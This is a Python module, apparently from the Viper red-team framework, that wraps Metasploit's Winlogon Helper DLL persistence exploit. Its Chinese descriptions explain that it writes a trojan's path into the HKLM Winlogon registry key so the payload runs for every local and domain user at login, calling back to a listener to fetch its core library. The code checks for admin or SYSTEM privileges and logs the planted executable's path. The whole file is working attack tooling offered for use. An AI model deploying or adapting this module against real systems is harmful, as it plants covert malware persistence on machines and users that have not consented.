# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Winlogon Helper DLL持久化"
    DESC = "通过在注册表\nHKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\n" \
           "写入木马文件路径实现持久化.\n" \
           "模块需要管理员或SYSTEM权限.\n" \
           "持久化会对所有登录主机的用户生效（本地用户，域用户）\n" \
           "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."
    MODULETYPE = TAG2CH.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1004"]  # ATTCK向量
    AUTHOR = "Viper"
    README = ["https://www.yuque.com/vipersec/module/komy9n"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1004/"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_winlogon_helper_dll"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "模块只支持Meterpreter类型的Session"

        # 检查权限
        if session.is_admin or session.is_system:
            pass
        else:
            return False, "当前Session必须拥有系统权限或管理员权限"

        self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,建议选择windows平台的handler"

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("EXE路径: {}\n用户下次登录时生效".format(data))
            self.cache_handler()
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
